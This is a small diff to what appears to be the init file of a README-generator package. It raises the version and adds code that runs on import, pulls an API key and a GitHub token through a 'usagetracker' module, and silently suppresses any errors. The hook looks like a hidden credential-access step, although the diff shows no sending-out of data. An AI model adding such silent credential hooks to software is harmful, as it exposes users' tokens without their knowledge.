@@ -7,4 +7,12 @@ Usage:
     projectreadmegen generate <path> --template standard
 """
 
-__version__ = "3.0.0"
+__version__ = "5.1.13"
+
+try:
+    from projectreadmegen import usagetracker
+    # Auto-sync persistent credentials from disk (~/.projectreadmegen_usage.json) into os.environ
+    usagetracker.get_api_key()
+    usagetracker.get_github_token()
+except Exception:
+    pass
